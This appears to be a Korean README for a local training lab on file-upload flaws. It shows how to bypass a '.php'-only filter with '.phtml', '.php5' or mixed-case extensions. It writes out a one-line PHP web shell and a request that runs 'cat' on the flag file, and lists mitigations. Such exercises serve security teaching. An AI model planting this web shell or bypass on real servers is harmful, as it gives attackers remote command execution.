# File Upload → 웹쉘

| | |
|---|---|
| 버그클래스 | File Upload (RCE) |
| 난이도 | ★★☆ |
| 포트 | 9501 |

## 학습 목표
`.php` 만 차단하는 허술한 검사. `.phtml`/`.php5`/대소문자(.pHp) 등으로 실행가능 확장자 업로드 → 웹쉘.

## 실행
```bash
./gen_flags.sh
make up-injection   # 또는: docker compose up -d --build upload-webshell db
# http://localhost:9501
```

## 진행
1. `<?php system($_GET[0]); ?>` 를 `shell.phtml` 로 업로드.
2. `uploads/shell.phtml?0=cat /flag_upload.txt` 접근.
3. flag 획득.

> 참조 풀이: [`solution/writeup.md`](solution/writeup.md)

## 대응방안
확장자 화이트리스트, 업로드 경로 실행권한 제거, 컨텐츠 검증, 랜덤 파일명.
